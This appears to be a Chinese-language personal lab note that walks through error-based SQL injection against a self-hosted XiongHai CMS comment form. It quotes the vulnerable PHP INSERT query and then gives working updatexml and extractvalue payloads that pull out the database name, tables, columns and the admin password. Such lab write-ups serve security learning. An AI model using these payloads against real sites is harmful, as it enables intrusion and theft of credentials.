---
{"dg-publish":true,"dg-path":"安全/靶场/自建环境_SQL报错盲注测试.md","permalink":"/安全/靶场/自建环境_SQL报错盲注测试/","title":"自建环境_SQL报错盲注测试"}
---

# 环境介绍

利用的是熊海CMS


在 `files/submit.php` 提交评论的文件中，有这样的代码
```php
$query = "INSERT INTO interaction (  
type,  
xs,  
cid,  
name,  
mail,  
url,  
touxiang,  
shebei,  
ip,  
content,  
tz,  
date  
) VALUES (  
'$type',  
'$xs',  
'$cid',  
'$name',  
'$mail',  
'$url',  
'$touxiang',  
'$shebei',  
'$ip',  
'$content',  
'$tz',  
now()  
)";  
@mysql_query($query) or die('新增错误：'.mysql_error());
```

也就是接收评论的信息然后插入数据库，最重要的是后面有报错返回

# 进行注入

接下来尝试将昵称改为payload

```sql
' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and '
```
注意要闭合单引号


![Pasted image 20240801105510.png](/img/user/picture/Pasted%20image%2020240801105510.png)

发现确实可以注入


## 获取数据库名

```sql
' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) and '
```
![Pasted image 20240801105955.png](/img/user/picture/Pasted%20image%2020240801105955.png)

## 获取表名

构建payload
```sql
' and updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1) and '

```
`LIMIT 0,1` 用于逐步获取表名。你可以从 `LIMIT 0,1` 开始，逐步增加偏移量来获取更多的表名，例如 `LIMIT 1,1`、`LIMIT 2,1` 等。
![Pasted image 20240801114453.png](/img/user/picture/Pasted%20image%2020240801114453.png)

## 获取列名

以表`manang`为例

```sql
' and updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='manage' LIMIT 0,1),0x7e),1) and '

```

![Pasted image 20240801115106.png](/img/user/picture/Pasted%20image%2020240801115106.png)

得到列名
id,user,name,password,img,mail



## 表中信息

```sql
' and updatexml(1,concat(0x7e,(SELECT name FROM seacms.manage WHERE id='1' LIMIT 0,1),0x7e),1) and '
```

![Pasted image 20240801115533.png](/img/user/picture/Pasted%20image%2020240801115533.png)

发现在显示密码的时候显示不全
```sql
' and extractvalue(1, concat(0x7e, (SELECT password FROM seacms.manage WHERE id='1' LIMIT 0,1), 0x7e)) and '
```